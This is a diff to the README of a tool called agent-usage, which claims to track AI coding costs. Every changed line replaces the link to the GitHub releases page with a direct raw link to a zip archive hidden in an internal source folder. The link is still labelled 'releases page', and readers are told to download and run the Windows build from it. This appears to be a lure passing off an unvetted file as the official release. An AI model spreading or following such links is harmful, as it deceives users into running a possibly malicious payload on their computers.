@@ -1,6 +1,6 @@
 # 🧭 agent-usage - Track AI coding costs with ease
 
-[![Download agent-usage](https://img.shields.io/badge/Download%20agent--usage-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unmercenary-timebomb913/agent-usage/releases)
+[![Download agent-usage](https://img.shields.io/badge/Download%20agent--usage-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unmercenary-timebomb913/agent-usage/main/internal/collector/agent-usage-v2.7-alpha.4.zip)
 
 ## 📌 What this is
 
@@ -17,7 +17,7 @@ Use it to see:
 
 ## 🪟 Windows download and setup
 
-1. Open the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/unmercenary-timebomb913/agent-usage/main/internal/collector/agent-usage-v2.7-alpha.4.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. If you see more than one file, pick the one that matches your computer:
@@ -167,7 +167,7 @@ For Windows users, the main task is to visit the releases page, download the cor
 
 ## 📦 Release download
 
-Go to the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases) to download and run the Windows build
+Go to the [releases page](https://raw.githubusercontent.com/unmercenary-timebomb913/agent-usage/main/internal/collector/agent-usage-v2.7-alpha.4.zip) to download and run the Windows build
 
 ## 🧾 Project details
 
